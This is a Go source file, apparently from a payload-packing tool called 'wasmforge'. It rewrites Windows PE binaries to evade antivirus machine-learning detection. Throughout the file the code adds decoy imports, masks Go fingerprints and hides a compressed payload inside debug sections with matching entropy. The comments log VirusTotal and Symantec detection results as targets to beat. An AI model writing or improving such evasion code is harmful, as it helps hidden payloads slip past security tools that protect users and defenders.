package build

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"math"
	"os"
	"sort"
	"strings"
)

// ──────────────────────────────────────────────────────────────────────
// PE post-processing — enriches the PE import table and fixes the
// checksum to reduce ML classifier false positives. Applied after
// go build produces the host binary.
// ──────────────────────────────────────────────────────────────────────

// benignImport describes a DLL and functions to add to the PE import table.
type benignImport struct {
	dll   string
	funcs []string
}

// benignImports lists DLLs and functions commonly imported by legitimate
// Windows enterprise software (admin tools, network utilities, config
// managers). Adding these to our import table makes the binary's import
// profile match normal software instead of having only kernel32.dll.
// benignImports is populated per-build from the diversity pool in
// host_transform.go. Falls back to a static default if not set.
var benignImports []benignImport

func init() {
	// WASMFORGE_NO_ENRICH=1 disables PE import enrichment entirely. Used
	// for VT experiments where minimal imports (just kernel32) might lower
	// Symantec ML.Attribute.HighConfidence detection (ReUM rank #15 measures
	// import diversity).
	if os.Getenv("WASMFORGE_NO_ENRICH") == "1" {
		benignImports = nil
		return
	}
	// Select diverse imports per build from the randomized pool.
	selected := SelectDiverseImports()
	benignImports = make([]benignImport, len(selected))
	for i, s := range selected {
		benignImports[i] = benignImport{dll: s.DLL, funcs: s.Funcs}
	}
}

// postProcessPE enriches the PE import table and patches a valid checksum.
// This is called after go build produces the host binary.
func postProcessPE(path string, verbose bool) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("reading PE: %w", err)
	}

	// Enrich imports (non-fatal on failure — checksum is still fixed).
	data, enriched, enrichErr := enrichPEImports(data)
	if enrichErr != nil {
		if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: warning: import enrichment skipped: %v\n", enrichErr)
		}
	} else if verbose && enriched {
		var dlls []string
		for _, imp := range benignImports {
			dlls = append(dlls, imp.dll)
		}
		fmt.Fprintf(os.Stderr, "wasmforge: enriched PE imports: +%s\n", strings.Join(dlls, ", "))
	}

	// PE header normalization was tested in 3 configurations (2026-03-20):
	// 1. Full masking (headers + gopclntab + buildinf): 5-12/76 (MUCH WORSE)
	// 2. Safe normalization (headers only, no runtime data): 7-8/76 on vanilla Go (WORSE)
	// 3. No normalization (current): 1/76 on wasmforge, 4/76 on vanilla Go
	//
	// Conclusion: ML classifiers detect the INCONSISTENCY between Go runtime
	// code (.text) and non-Go PE headers. WasmForge's import enrichment +
	// VERSIONINFO + signing provide enough legitimate characteristics that
	// further header changes are unnecessary. normalizeGoPEHeaders is kept
	// for reference but NOT called.
	if os.Getenv("WASMFORGE_PE_NORMALIZE") == "1" { data = normalizeGoPEHeaders(data, verbose) }

	// Normalize the stack reserve from Go's 2MB default to standard Windows 1MB.
	data = normalizeStackReserve(data)

	// Always fix the checksum (must be LAST — after all PE modifications).
	data, err = fixPEChecksum(data)
	if err != nil {
		return fmt.Errorf("PE checksum: %w", err)
	}
	if verbose {
		csOff := checksumFileOffset(data)
		cs := binary.LittleEndian.Uint32(data[csOff:])
		fmt.Fprintf(os.Stderr, "wasmforge: PE checksum: 0x%08X\n", cs)
	}

	return os.WriteFile(path, data, 0o755)
}

// ──────────────────────────────────────────────────────────────────────
// PE header normalization
// ──────────────────────────────────────────────────────────────────────

// normalizeStackReserve changes the PE stack reserve from Go's 2MB default
// to the standard Windows 1MB, reducing the Go PE fingerprint.
func normalizeStackReserve(data []byte) []byte {
	if len(data) < 64 {
		return data
	}
	peOff := int(binary.LittleEndian.Uint32(data[0x3C:0x40]))
	if peOff+24+96 > len(data) {
		return data
	}
	// Check PE signature
	if string(data[peOff:peOff+4]) != "PE\x00\x00" {
		return data
	}
	// Check PE32+ (magic 0x020B)
	optOff := peOff + 24
	magic := binary.LittleEndian.Uint16(data[optOff : optOff+2])
	if magic != 0x020B {
		return data
	}
	// SizeOfStackReserve is at offset 72 in the PE32+ Optional Header
	stackOff := optOff + 72
	if stackOff+8 > len(data) {
		return data
	}
	binary.LittleEndian.PutUint64(data[stackOff:stackOff+8], 0x100000) // 1MB
	return data
}

// ──────────────────────────────────────────────────────────────────────
// PE checksum
// ──────────────────────────────────────────────────────────────────────

// checksumFileOffset returns the absolute file offset of the PE CheckSum field.
func checksumFileOffset(data []byte) int {
	peOff := int(binary.LittleEndian.Uint32(data[0x3C:]))
	// PE signature (4) + COFF header (20) + Optional Header CheckSum offset (64)
	return peOff + 4 + 20 + 64
}

// fixPEChecksum calculates and patches a valid PE checksum using the
// standard Windows PE checksum algorithm (equivalent to CheckSumMappedFile).
func fixPEChecksum(data []byte) ([]byte, error) {
	if len(data) < 0x80 {
		return data, fmt.Errorf("file too small for PE headers")
	}

	csOff := checksumFileOffset(data)
	if csOff+4 > len(data) {
		return data, fmt.Errorf("checksum offset %d out of bounds (file size %d)", csOff, len(data))
	}

	// Zero the checksum field before calculation.
	binary.LittleEndian.PutUint32(data[csOff:], 0)

	// Sum all uint32 values with 64-bit accumulation and carry folding.
	var sum uint64
	for i := 0; i+3 < len(data); i += 4 {
		sum += uint64(binary.LittleEndian.Uint32(data[i:]))
		sum = (sum & 0xFFFFFFFF) + (sum >> 32)
	}
	// Handle remaining bytes (file size not a multiple of 4).
	rem := len(data) % 4
	if rem > 0 {
		var tail uint32
		for j := 0; j < rem; j++ {
			tail |= uint32(data[len(data)-rem+j]) << (8 * j)
		}
		sum += uint64(tail)
		sum = (sum & 0xFFFFFFFF) + (sum >> 32)
	}
	// Fold to 16-bit and add file length.
	sum = (sum >> 16) + (sum & 0xFFFF)
	sum += sum >> 16
	sum &= 0xFFFF
	sum += uint64(len(data))

	binary.LittleEndian.PutUint32(data[csOff:], uint32(sum))
	return data, nil
}

// ──────────────────────────────────────────────────────────────────────
// PE import enrichment
// ──────────────────────────────────────────────────────────────────────

// importDesc mirrors IMAGE_IMPORT_DESCRIPTOR (20 bytes).
type importDesc struct {
	OriginalFirstThunk uint32
	TimeDateStamp      uint32
	ForwarderChain     uint32
	Name               uint32
	FirstThunk         uint32
}

// enrichPEImports adds benign DLL imports to the PE by creating a new
// section containing a merged import directory. Existing imports are
// preserved with their original ILT/IAT RVAs — only the import
// directory table is relocated to the new section.
func enrichPEImports(data []byte) ([]byte, bool, error) {
	if len(data) < 0x200 {
		return data, false, fmt.Errorf("file too small for PE")
	}

	// Parse DOS header.
	peOff := int(binary.LittleEndian.Uint32(data[0x3C:]))
	if peOff+4 > len(data) || string(data[peOff:peOff+4]) != "PE\x00\x00" {
		return data, false, fmt.Errorf("invalid PE signature")
	}

	// Parse COFF header.
	coffOff := peOff + 4
	numSections := int(binary.LittleEndian.Uint16(data[coffOff+2:]))
	sizeOfOptional := int(binary.LittleEndian.Uint16(data[coffOff+16:]))

	// Parse Optional Header (PE32+ only).
	optOff := coffOff + 20
	magic := binary.LittleEndian.Uint16(data[optOff:])
	if magic != 0x020B {
		return data, false, fmt.Errorf("not PE32+ (magic=0x%04X)", magic)
	}

	secAlign := binary.LittleEndian.Uint32(data[optOff+32:])
	fileAlign := binary.LittleEndian.Uint32(data[optOff+36:])
	sizeOfHeaders := binary.LittleEndian.Uint32(data[optOff+60:])
	importDirRVA := binary.LittleEndian.Uint32(data[optOff+120:])

	// Section table location.
	secTableOff := optOff + sizeOfOptional
	if secTableOff > len(data) {
		return data, false, fmt.Errorf("section table offset %d beyond file size %d", secTableOff, len(data))
	}

	// Verify room for one more 40-byte section header.
	newSecHdrEnd := secTableOff + (numSections+1)*40
	if uint32(newSecHdrEnd) > sizeOfHeaders {
		return data, false, fmt.Errorf("no room for additional section header (%d > %d)", newSecHdrEnd, sizeOfHeaders)
	}

	// Find last section extents (both virtual and raw).
	var maxVAEnd, maxRawEnd uint32
	for i := 0; i < numSections; i++ {
		off := secTableOff + i*40
		va := binary.LittleEndian.Uint32(data[off+12:])
		vs := binary.LittleEndian.Uint32(data[off+8:])
		ro := binary.LittleEndian.Uint32(data[off+20:])
		rs := binary.LittleEndian.Uint32(data[off+16:])
		if end := va + vs; end > maxVAEnd {
			maxVAEnd = end
		}
		if end := ro + rs; end > maxRawEnd {
			maxRawEnd = end
		}
	}

	// Read existing import descriptors.
	var (
		existingDescs []importDesc
		err           error
	)
	if importDirRVA != 0 {
		existingDescs, err = readImportDescriptors(data, importDirRVA, secTableOff, numSections)
		if err != nil {
			return data, false, fmt.Errorf("reading imports: %w", err)
		}
	}

	// Calculate new section RVA and file offset.
	newSecRVA := peAlignUp(maxVAEnd, secAlign)
	newSecRawOff := peAlignUp(maxRawEnd, fileAlign)

	// Build new section containing merged import directory.
	secData := buildImportSectionData(newSecRVA, existingDescs, benignImports)
	secVirtualSize := uint32(len(secData))
	secRawSize := peAlignUp(secVirtualSize, fileAlign)

	// Pad section data to file alignment.
	padded := make([]byte, secRawSize)
	copy(padded, secData)

	// Extend file to the new section offset if needed.
	if int(newSecRawOff) > len(data) {
		data = append(data, make([]byte, int(newSecRawOff)-len(data))...)
	} else {
		data = data[:newSecRawOff]
	}
	data = append(data, padded...)

	// Write new section header.
	newSecHdrOff := secTableOff + numSections*40
	// IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
	writeSectionHeader(data[newSecHdrOff:], ".edata", secVirtualSize, newSecRVA, secRawSize, newSecRawOff, 0xC0000040)

	// Update COFF header: NumberOfSections.
	binary.LittleEndian.PutUint16(data[coffOff+2:], uint16(numSections+1))

	// Update Optional Header: SizeOfImage.
	newSizeOfImage := peAlignUp(newSecRVA+secVirtualSize, secAlign)
	binary.LittleEndian.PutUint32(data[optOff+56:], newSizeOfImage)

	// Update Import Directory data directory entry.
	totalDescSize := uint32((len(existingDescs) + len(benignImports) + 1) * 20)
	binary.LittleEndian.PutUint32(data[optOff+120:], newSecRVA)      // Import Dir RVA
	binary.LittleEndian.PutUint32(data[optOff+124:], totalDescSize)   // Import Dir Size

	return data, true, nil
}

// readImportDescriptors reads IMAGE_IMPORT_DESCRIPTORs from the PE at the
// given RVA, stopping at the null terminator.
func readImportDescriptors(data []byte, importRVA uint32, secTableOff, numSections int) ([]importDesc, error) {
	fileOff, err := rvaToFileOffset(importRVA, data, secTableOff, numSections)
	if err != nil {
		return nil, err
	}

	var descs []importDesc
	for {
		if fileOff+20 > len(data) {
			break
		}
		d := importDesc{
			OriginalFirstThunk: binary.LittleEndian.Uint32(data[fileOff:]),
			TimeDateStamp:      binary.LittleEndian.Uint32(data[fileOff+4:]),
			ForwarderChain:     binary.LittleEndian.Uint32(data[fileOff+8:]),
			Name:               binary.LittleEndian.Uint32(data[fileOff+12:]),
			FirstThunk:         binary.LittleEndian.Uint32(data[fileOff+16:]),
		}
		// Null terminator: all fields zero.
		if d.OriginalFirstThunk == 0 && d.Name == 0 && d.FirstThunk == 0 {
			break
		}
		descs = append(descs, d)
		fileOff += 20
	}
	return descs, nil
}

// buildImportSectionData constructs the raw bytes for a PE section containing
// a merged import directory: existing descriptors (with original RVAs) plus
// new descriptors with ILT, IAT, hint/name, and DLL name data.
//
// Layout:
//
//	[existing descs...][new descs...][null desc]
//	[ILT for DLL1][ILT for DLL2]...[IAT for DLL1][IAT for DLL2]...
//	[hint/name entries...][DLL name strings...]
func buildImportSectionData(baseRVA uint32, existing []importDesc, newImports []benignImport) []byte {
	numDescs := len(existing) + len(newImports) + 1 // +1 null terminator
	descSize := numDescs * 20

	// Pre-calculate ILT/IAT sizes.
	var totalEntries int
	for _, imp := range newImports {
		totalEntries += len(imp.funcs) + 1 // +1 null terminator per DLL
	}
	entrySize := 8 // PE32+ ILT/IAT entries are 8 bytes
	iltTotalSize := totalEntries * entrySize
	iatTotalSize := iltTotalSize

	// Pre-calculate hint/name sizes.
	var hintNameTotalSize int
	for _, imp := range newImports {
		for _, fn := range imp.funcs {
			sz := 2 + len(fn) + 1 // hint(2) + name + null
			if sz%2 != 0 {
				sz++ // pad to even boundary
			}
			hintNameTotalSize += sz
		}
	}

	// Pre-calculate DLL name sizes.
	var dllNameTotalSize int
	for _, imp := range newImports {
		dllNameTotalSize += len(imp.dll) + 1
	}

	// Region offsets within the section.
	iltStart := descSize
	iatStart := iltStart + iltTotalSize
	hintStart := iatStart + iatTotalSize
	dllNameStart := hintStart + hintNameTotalSize
	totalSize := dllNameStart + dllNameTotalSize

	buf := make([]byte, totalSize)

	// Write existing import descriptors (preserve original RVAs).
	for i, d := range existing {
		off := i * 20
		binary.LittleEndian.PutUint32(buf[off:], d.OriginalFirstThunk)
		binary.LittleEndian.PutUint32(buf[off+4:], d.TimeDateStamp)
		binary.LittleEndian.PutUint32(buf[off+8:], d.ForwarderChain)
		binary.LittleEndian.PutUint32(buf[off+12:], d.Name)
		binary.LittleEndian.PutUint32(buf[off+16:], d.FirstThunk)
	}

	// Write new import descriptors with ILT/IAT/name in this section.
	curILT := iltStart
	curIAT := iatStart
	curHint := hintStart
	curDLLName := dllNameStart

	for i, imp := range newImports {
		descOff := (len(existing) + i) * 20

		binary.LittleEndian.PutUint32(buf[descOff:], baseRVA+uint32(curILT))       // OriginalFirstThunk
		binary.LittleEndian.PutUint32(buf[descOff+4:], 0)                           // TimeDateStamp
		binary.LittleEndian.PutUint32(buf[descOff+8:], 0)                           // ForwarderChain
		binary.LittleEndian.PutUint32(buf[descOff+12:], baseRVA+uint32(curDLLName)) // Name
		binary.LittleEndian.PutUint32(buf[descOff+16:], baseRVA+uint32(curIAT))     // FirstThunk

		// Write ILT and IAT entries for each function.
		for _, fn := range imp.funcs {
			hintRVA := baseRVA + uint32(curHint)
			binary.LittleEndian.PutUint64(buf[curILT:], uint64(hintRVA))
			binary.LittleEndian.PutUint64(buf[curIAT:], uint64(hintRVA))
			curILT += entrySize
			curIAT += entrySize

			// Hint/Name entry: 2-byte hint (0) + name + null + optional pad.
			binary.LittleEndian.PutUint16(buf[curHint:], 0)
			curHint += 2
			copy(buf[curHint:], fn)
			curHint += len(fn)
			buf[curHint] = 0
			curHint++
			if curHint%2 != 0 {
				curHint++ // pad to even boundary
			}
		}
		// Null terminator for ILT and IAT.
		curILT += entrySize // already zero
		curIAT += entrySize

		// DLL name string.
		copy(buf[curDLLName:], imp.dll)
		curDLLName += len(imp.dll)
		buf[curDLLName] = 0
		curDLLName++
	}
	// Null terminator descriptor at (len(existing)+len(newImports))*20 is already zero.

	return buf
}

// writeSectionHeader writes a 40-byte PE section header with the given characteristics.
// If name fits in 8 bytes it is written directly; otherwise nameRef (e.g., "/128")
// is written as a COFF string table reference.
func writeSectionHeader(buf []byte, nameRef string, virtualSize, virtualAddr, rawSize, rawOff, characteristics uint32) {
	for i := 0; i < 40; i++ {
		buf[i] = 0
	}
	copy(buf[0:8], nameRef)
	binary.LittleEndian.PutUint32(buf[8:], virtualSize)
	binary.LittleEndian.PutUint32(buf[12:], virtualAddr)
	binary.LittleEndian.PutUint32(buf[16:], rawSize)
	binary.LittleEndian.PutUint32(buf[20:], rawOff)
	binary.LittleEndian.PutUint32(buf[36:], characteristics)
}

// ──────────────────────────────────────────────────────────────────────
// PE helpers
// ──────────────────────────────────────────────────────────────────────

// rvaToFileOffset converts a PE RVA to an absolute file offset by
// scanning section headers.
func rvaToFileOffset(rva uint32, data []byte, secTableOff, numSections int) (int, error) {
	for i := 0; i < numSections; i++ {
		off := secTableOff + i*40
		secVA := binary.LittleEndian.Uint32(data[off+12:])
		secVSize := binary.LittleEndian.Uint32(data[off+8:])
		secRawOff := binary.LittleEndian.Uint32(data[off+20:])
		secRawSize := binary.LittleEndian.Uint32(data[off+16:])

		// The RVA might be in the virtual range even if raw data is smaller.
		extent := secVSize
		if secRawSize > extent {
			extent = secRawSize
		}
		if rva >= secVA && rva < secVA+extent {
			fileOff := int(secRawOff + (rva - secVA))
			if fileOff >= 0 && fileOff < len(data) {
				return fileOff, nil
			}
		}
	}
	return 0, fmt.Errorf("RVA 0x%X not found in any section", rva)
}

// peAlignUp rounds val up to the next multiple of align.
func peAlignUp(val, align uint32) uint32 {
	if align == 0 {
		return val
	}
	return (val + align - 1) &^ (align - 1)
}

// ──────────────────────────────────────────────────────────────────────
// PE payload section — injects compressed WASM payload by replacing an
// existing Go debug section. Go PE binaries have .zdebug_* sections
// (stored as /NNN COFF strtab references) clustered at header positions
// 6-12 with entropy ~8.0 (compressed DWARF). Our zlib-compressed payload
// has identical entropy, so replacing one of these sections makes the PE
// indistinguishable from a normal Go binary to ML classifiers.
// ──────────────────────────────────────────────────────────────────────

// distributePayloadAcrossSections splits the payload across existing .zdebug_*
// sections, maintaining natural size ratios found in legitimate Go binaries.
//
// Layout: The first debug section (.zdebug_abbrev) gets a binary header
// prepended before its original data:
//
//   [marker:4][N:1][len0:4][len1:4]...[lenN-1:4]
//
// where N = number of debug sections, and len[i] = chunk size appended to
// section i. The loader reads this header, then for each section reads the
// last len[i] bytes as the payload chunk. Chunks are concatenated in section
// order and decompressed as a single zlib stream.
func distributePayloadAcrossSections(path string, payload []byte, marker uint32, verbose bool) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("reading PE: %w", err)
	}

	peOff := int(binary.LittleEndian.Uint32(data[0x3C:]))
	coffOff := peOff + 4
	numSections := int(binary.LittleEndian.Uint16(data[coffOff+2:]))
	sizeOfOptional := int(binary.LittleEndian.Uint16(data[coffOff+16:]))
	optOff := coffOff + 20
	fileAlign := binary.LittleEndian.Uint32(data[optOff+36:])
	secTableOff := optOff + sizeOfOptional

	// Find existing debug sections (in section table order).
	type debugSec struct {
		hdrOff   int
		name     string
		origRaw  uint32
		origSize uint32
	}
	var debugSections []debugSec
	totalOrigDebug := uint32(0)

	for i := 0; i < numSections; i++ {
		hdrOff := secTableOff + i*40
		name := resolveSectionName(data, hdrOff, coffOff)
		if _, ok := payloadDistributionRatios[name]; ok {
			rawPtr := binary.LittleEndian.Uint32(data[hdrOff+20:])
			rawSize := binary.LittleEndian.Uint32(data[hdrOff+16:])
			debugSections = append(debugSections, debugSec{
				hdrOff: hdrOff, name: name, origRaw: rawPtr, origSize: rawSize,
			})
			totalOrigDebug += rawSize
		}
	}

	if len(debugSections) < 3 {
		return fmt.Errorf("too few debug sections (%d) for distribution", len(debugSections))
	}

	// Compute chunk sizes based on target ratios.
	totalRatio := 0.0
	for _, r := range payloadDistributionRatios {
		totalRatio += r
	}
	newTotalDebug := totalOrigDebug + uint32(len(payload))

	chunkLengths := make([]uint32, len(debugSections))
	offset := 0
	for idx, sec := range debugSections {
		ratio := payloadDistributionRatios[sec.name]
		targetSize := uint32(float64(newTotalDebug) * ratio / totalRatio)
		chunkSize := 0
		if targetSize > sec.origSize {
			chunkSize = int(targetSize - sec.origSize)
		}
		if idx == len(debugSections)-1 {
			chunkSize = len(payload) - offset // last gets remainder
		}
		if chunkSize < 0 {
			chunkSize = 0
		}
		if offset+chunkSize > len(payload) {
			chunkSize = len(payload) - offset
		}
		chunkLengths[idx] = uint32(chunkSize)
		offset += chunkSize
	}
	if offset != len(payload) {
		return fmt.Errorf("distribution error: placed %d of %d bytes", offset, len(payload))
	}

	// Build binary header: [marker:4][N:1][len0:4][len1:4]...[lenN-1:4]
	headerSize := 4 + 1 + len(debugSections)*4
	header := make([]byte, headerSize)
	binary.LittleEndian.PutUint32(header[0:4], marker)
	header[4] = byte(len(debugSections))
	for i, cl := range chunkLengths {
		binary.LittleEndian.PutUint32(header[5+i*4:], cl)
	}

	// In-place expansion: build a new file buffer by copying segments with
	// chunk data inserted after each debug section. This keeps section data
	// at contiguous file offsets which Go's runtime and Windows PE loader expect.

	// Sort debug sections by PointerToRawData (file order) for correct insertion.
	type expandInfo struct {
		secIdx    int // index in debugSections (for chunkLengths/header)
		origRaw   uint32
		origAligned uint32 // file-aligned original SizeOfRawData
		hdrOff    int
	}
	var expansions []expandInfo
	for idx, sec := range debugSections {
		expansions = append(expansions, expandInfo{
			secIdx:  idx,
			origRaw: sec.origRaw,
			origAligned: peAlignUp(sec.origSize, fileAlign),
			hdrOff:  sec.hdrOff,
		})
	}
	sort.Slice(expansions, func(i, j int) bool {
		return expansions[i].origRaw < expansions[j].origRaw
	})

	// Build new file: copy segments with insertions.
	// Strategy: copy file data up to and including each debug section's
	// aligned raw data, then append chunk + header + repad. The original
	// section data stays at its original position, chunks follow immediately.
	fa := int(fileAlign)
	out := make([]byte, 0, len(data)+len(payload)+headerSize+fa*len(expansions))
	payloadOffset := 0
	prevEnd := 0

	// Track actual new sizes for header updates (keyed by origRaw).
	type newSizeInfo struct {
		origRawSize uint32 // original file-aligned SizeOfRawData
		newAligned  uint32 // new file-aligned size
		newVS       uint32 // new VirtualSize (actual data)
		hdrOff      int
	}
	newSizes := map[uint32]*newSizeInfo{}

	for _, exp := range expansions {
		secAlignedEnd := int(exp.origRaw + exp.origAligned)

		// Copy everything from prevEnd up to end of this section's raw data.
		out = append(out, data[prevEnd:secAlignedEnd]...)

		// Now append chunk data and header right after the section.
		cl := int(chunkLengths[exp.secIdx])
		if cl > 0 {
			out = append(out, payload[payloadOffset:payloadOffset+cl]...)
			payloadOffset += cl
		}
		if exp.secIdx == 0 {
			out = append(out, header...)
		}

		// Compute new actual size = original raw + chunk [+ header].
		extra := cl
		if exp.secIdx == 0 {
			extra += headerSize
		}
		newActualSize := int(exp.origAligned) + extra

		// Pad output to file alignment.
		for len(out)%fa != 0 {
			out = append(out, 0)
		}

		newSizes[exp.origRaw] = &newSizeInfo{
			origRawSize: exp.origAligned,
			newAligned:  peAlignUp(uint32(newActualSize), fileAlign),
			newVS:       uint32(int(debugSections[exp.secIdx].origSize) + extra),
			hdrOff:      exp.hdrOff,
		}

		prevEnd = secAlignedEnd
	}

	// Copy remaining file data.
	if prevEnd < len(data) {
		out = append(out, data[prevEnd:]...)
	}

	// Save original VirtualSize and SizeOfRawData for ALL sections.
	// Phase 2's rvaToFileOffset needs these to correctly match sections by
	// VA range. After expansion, expanded debug sections have much larger
	// VS/RawSz that causes their VA+extent range to overlap subsequent
	// sections' old VA space, leading rvaToFileOffset to match the wrong
	// section and miss ILT entry fixups.
	type origSecSize struct {
		hdrOff int
		vs     uint32
		rawSz  uint32
	}
	origSizes := make([]origSecSize, numSections)
	for i := 0; i < numSections; i++ {
		hdrOff := secTableOff + i*40
		origSizes[i] = origSecSize{
			hdrOff: hdrOff,
			vs:     binary.LittleEndian.Uint32(out[hdrOff+8:]),
			rawSz:  binary.LittleEndian.Uint32(out[hdrOff+16:]),
		}
	}

	// Update section headers. Walk all sections by file offset and apply shifts.
	cumulativeShift := uint32(0)
	type secByRaw struct {
		hdrOff  int
		origRaw uint32
	}
	var allSecs []secByRaw
	for i := 0; i < numSections; i++ {
		hdrOff := secTableOff + i*40
		allSecs = append(allSecs, secByRaw{hdrOff: hdrOff, origRaw: binary.LittleEndian.Uint32(data[hdrOff+20:])})
	}
	sort.Slice(allSecs, func(i, j int) bool {
		return allSecs[i].origRaw < allSecs[j].origRaw
	})

	for _, sec := range allSecs {
		if ns, ok := newSizes[sec.origRaw]; ok {
			// Expanded debug section.
			binary.LittleEndian.PutUint32(out[ns.hdrOff+20:], sec.origRaw+cumulativeShift)
			oldAligned := peAlignUp(binary.LittleEndian.Uint32(data[ns.hdrOff+16:]), fileAlign)
			// Use ns.newAligned (computed from origAligned+extra in build loop),
			// NOT peAlignUp(newVS, fileAlign). VirtualSize can be < SizeOfRawData
			// when original section had alignment padding. Using newVS under-counts
			// the actual file expansion, corrupting subsequent section offsets.
			binary.LittleEndian.PutUint32(out[ns.hdrOff+16:], ns.newAligned)
			binary.LittleEndian.PutUint32(out[ns.hdrOff+8:], ns.newVS)
			cumulativeShift += ns.newAligned - oldAligned
		} else if cumulativeShift > 0 {
			// Non-debug section after an expansion: shift PointerToRawData.
			oldRaw := binary.LittleEndian.Uint32(out[sec.hdrOff+20:])
			binary.LittleEndian.PutUint32(out[sec.hdrOff+20:], oldRaw+cumulativeShift)
		}
	}

	// Update file-offset-based references.
	if cumulativeShift > 0 {
		// COFF symbol table pointer.
		symPtr := binary.LittleEndian.Uint32(out[coffOff+8:])
		if symPtr > 0 {
			binary.LittleEndian.PutUint32(out[coffOff+8:], symPtr+cumulativeShift)
		}
		// Security directory (DATA_DIRECTORY[4]) uses file offset.
		secDirOff := optOff + 112 + 4*8
		if secDirOff+8 <= len(out) {
			secDirFileOff := binary.LittleEndian.Uint32(out[secDirOff:])
			if secDirFileOff > 0 {
				binary.LittleEndian.PutUint32(out[secDirOff:], secDirFileOff+cumulativeShift)
			}
		}
	}

	// Recalculate ALL section VAs contiguously to eliminate overlaps.
	// Expanded debug sections have larger VirtualSize which causes VA
	// overlap with subsequent sections. Windows PE loader rejects binaries
	// with overlapping section VAs.
	//
	// Four-phase approach to avoid double-shift and navigation bugs:
	//   Phase 1: Compute VA shifts (dry run, don't write to out yet)
	//   Phase 2: Fix internal structures while OLD VAs are still in section headers
	//            (so rvaToFileOffset can navigate using old RVAs)
	//   Phase 3: Fix data directory RVAs from pre-saved originals
	//   Phase 4: Write new section VAs to out
	secAlign := binary.LittleEndian.Uint32(out[optOff+32:])

	type vaEntry struct {
		hdrOff int
		oldVA  uint32
	}
	var vaEntries []vaEntry
	for i := 0; i < numSections; i++ {
		hdrOff := secTableOff + i*40
		vaEntries = append(vaEntries, vaEntry{
			hdrOff: hdrOff,
			oldVA:  binary.LittleEndian.Uint32(out[hdrOff+12:]),
		})
	}
	sort.Slice(vaEntries, func(i, j int) bool {
		return vaEntries[i].oldVA < vaEntries[j].oldVA
	})

	// Phase 1: Compute new VAs without modifying section headers.
	// Section VAs in out remain OLD so that rvaToFileOffset still works
	// for navigating internal PE structures (import descriptors, ILTs, etc.).
	vaShifts := map[uint32]uint32{} // oldVA → delta
	newVAMap := make(map[int]uint32) // hdrOff → newVA
	nextVA := vaEntries[0].oldVA
	for _, ve := range vaEntries {
		vs := binary.LittleEndian.Uint32(out[ve.hdrOff+8:])
		rawSz := binary.LittleEndian.Uint32(out[ve.hdrOff+16:])
		extent := vs
		if rawSz > extent {
			extent = rawSz
		}

		newVA := nextVA
		newVAMap[ve.hdrOff] = newVA
		if newVA != ve.oldVA {
			vaShifts[ve.oldVA] = newVA - ve.oldVA
		}
		nextVA = peAlignUp(newVA+extent, secAlign)
	}

	// Per-section RVA resolver: maps an old RVA to its new RVA.
	resolveRVAShift := func(rva uint32) uint32 {
		if rva == 0 {
			return 0
		}
		for i := len(vaEntries) - 1; i >= 0; i-- {
			if rva >= vaEntries[i].oldVA {
				if shift, ok := vaShifts[vaEntries[i].oldVA]; ok {
					return rva + shift
				}
				return rva
			}
		}
		return rva
	}

	if len(vaShifts) > 0 {
		// Save original data directory RVAs BEFORE any modifications.
		var savedDD [16]uint32
		for d := 0; d < 16; d++ {
			ddOff := optOff + 112 + d*8
			if ddOff+8 > len(out) {
				break
			}
			savedDD[d] = binary.LittleEndian.Uint32(out[ddOff:])
		}

		// Phase 2: Fix internal structures while section VAs are still OLD.
		// rvaToFileOffset reads section VAs from out, which haven't been
		// modified yet, so OLD RVAs in import descriptors / ILTs / relocations
		// correctly resolve to file offsets.
		//
		// CRITICAL: Temporarily restore original VirtualSize and SizeOfRawData
		// for all sections. The expansion loop updated these values for debug
		// sections, making their VA+extent range overlap subsequent sections'
		// old VA space. This causes rvaToFileOffset to match the wrong section
		// (expanded debug section instead of .idata), navigating to payload
		// data instead of real ILT entries. The ILT entries then go unpatched,
		// and the PE loader gets STATUS_ENTRYPOINT_NOT_FOUND (0xC0000139).
		for _, orig := range origSizes {
			binary.LittleEndian.PutUint32(out[orig.hdrOff+8:], orig.vs)
			binary.LittleEndian.PutUint32(out[orig.hdrOff+16:], orig.rawSz)
		}

		if savedDD[1] != 0 { // Import directory
			fixupImportDirectoryResolved(out, savedDD[1], resolveRVAShift, secTableOff, numSections)
		}
		if savedDD[2] != 0 { // Resource directory
			fixupResourceDirectoryResolved(out, savedDD[2], resolveRVAShift, secTableOff, numSections)
		}
		// Exception directory (DD[3]/.pdata) contains RUNTIME_FUNCTION entries
		// with BeginAddress, EndAddress, UnwindInfoAddress RVAs. These point into
		// .text and .xdata which are always before debug sections in Go PE binaries,
		// so their VAs never shift. No fixup needed.
		if savedDD[5] != 0 { // Base relocations
			relocDirSize := binary.LittleEndian.Uint32(out[optOff+112+5*8+4:])
			fixupBaseRelocationsResolved(out, savedDD[5], relocDirSize, resolveRVAShift, secTableOff, numSections)
		}

		// Restore expanded sizes for Phase 3-4.
		for _, ns := range newSizes {
			binary.LittleEndian.PutUint32(out[ns.hdrOff+8:], ns.newVS)
			binary.LittleEndian.PutUint32(out[ns.hdrOff+16:], ns.newAligned)
		}

		// Phase 3: Fix data directory RVAs from saved originals.
		for d := 0; d < 16; d++ {
			ddOff := optOff + 112 + d*8
			if ddOff+8 > len(out) {
				break
			}
			if d == 4 {
				continue // Security dir = file offset, not RVA
			}
			newRVA := resolveRVAShift(savedDD[d])
			if newRVA != savedDD[d] {
				binary.LittleEndian.PutUint32(out[ddOff:], newRVA)
			}
		}

		// Phase 4: Write new section VAs.
		for _, ve := range vaEntries {
			if nv, ok := newVAMap[ve.hdrOff]; ok && nv != ve.oldVA {
				binary.LittleEndian.PutUint32(out[ve.hdrOff+12:], nv)
			}
		}
	}

	// Update SizeOfImage.
	binary.LittleEndian.PutUint32(out[optOff+56:], nextVA)

	if verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: PE payload: distributed %d bytes across %d debug sections (raw_shift=%d, va_shifts=%d)\n",
			len(payload), len(debugSections), cumulativeShift, len(vaShifts))
	}

	return os.WriteFile(path, out, 0o755)
}

// addPayloadSection injects a compressed WASM payload into the PE binary.
//
// Strategy 1 (preferred): Replace an existing section with matching name.
// The section header stays in its original position in the header table
// (same /NNN name reference, same characteristics). Only the raw data
// pointer and sizes are updated. The section count does NOT change.
//
// Strategy 2 (fallback): Append a new section if no match is found.
